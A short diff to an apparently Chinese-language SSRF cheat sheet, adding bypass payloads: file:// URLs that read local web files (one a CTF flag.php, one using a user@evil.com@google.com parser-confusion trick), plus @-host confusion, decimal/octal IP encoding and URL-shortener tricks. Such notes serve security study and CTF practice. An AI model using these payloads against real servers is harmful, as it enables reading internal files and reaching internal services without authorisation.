@@ -5,6 +5,9 @@ SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获
 
 ## 常用绕过 payload等
 ```
+
+admin=1&url=file://www.ichunqiu.com/var/www/html/flag.php
+file://user@evil.com:80@www.google.com//var/www/html/index.php%23
 使用@：http://A.com@10.10.10.10 = 10.10.10.10
 IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
